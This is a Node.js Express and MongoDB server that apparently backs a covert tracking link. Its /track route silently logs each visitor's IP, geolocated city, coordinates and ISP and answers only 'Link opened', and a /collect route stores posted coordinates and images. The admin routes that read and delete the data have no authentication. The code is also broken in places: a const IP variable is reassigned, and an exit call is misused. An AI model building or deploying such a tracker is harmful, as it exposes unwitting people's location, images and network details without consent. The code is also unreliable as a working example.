const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const fetch = require("node-fetch");
const app = express();
require("dotenv").config();

/* Middleware */
app.use(cors());
app.use(express.json({ limit: "10mb" }));

/* MongoDB */
async function connectionDB(){
  try{
    await mongoose.connect(process.env.dbURL);
    console.log("MongoDB connected");
  }catch(err){
    console.log("MongoDB connection failed: ", err);
    process.getMaxListeners(1);
  }
}

connectionDB();
/* Schema */
const dataSchema = new mongoose.Schema(
  {
    latitude: String,
    longitude: String,
    image: String,
    userAgent: String,
    time: String,
  },
  { timestamps: true }
);

const trackerSchema = new mongoose.Schema(
  {
  ip: String,
  userAgent: String,
  time: String,

  country: String,
  region: String,
  city: String,
  latitude: Number,
  longitude: Number,
  isp: String,
  },
  {timestamps: true}
)

const CollectedData = mongoose.model("CollectedData", dataSchema);
const trackedData = mongoose.model("trackedData",trackerSchema);

/* Routes */
app.post("/collect", async (req, res) => {
  await new CollectedData(req.body).save();
  res.json({ message: "Data stored successfully" });
});

app.get("/admin/data", async (req, res) => {
  const allData = await CollectedData.find().sort({ createdAt: -1 });
  res.json(allData);
});

app.delete("/admin/clear", async (req, res) => {
  const result = await CollectedData.deleteMany({});
  console.log("ADMIN CLEAR → Deleted:", result.deletedCount);
  res.json({ message: `Deleted ${result.deletedCount} records` });
});

// backend tracking4
app.get("/track", async (req, res) => {
  try {
    
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress;

      // Handle localhost / IPv6 localhost
    if (ip === "::1" || ip === "127.0.0.1") {
      // TEST IP (Google DNS) — only for local testing
      ip = "8.8.8.8";
    }

    ip = ip.replace("::ffff:", "");

    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const location = await response.json();

    const data = {
      ip,
      userAgent: req.headers["user-agent"],
      time: new Date().toLocaleString("en-IN", {
      dateStyle: "medium",
      timeStyle: "short",
      }),

      country: location.country_name,
      city: location.city,
      region: location.region,
      latitude: location.latitude,
      longitude: location.longitude,
      isp: location.org,
    };

    await trackedData.create(data);

    res.send("Link opened");
  } catch (err) {
    console.error(err);
    res.status(500).send("Tracking failed");
  }
});



app.get("/tracked/data", async (req, res) => {
  const allData = await trackedData.find().sort({ createdAt: -1 });
  res.json(allData);
});


/* Server */
const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
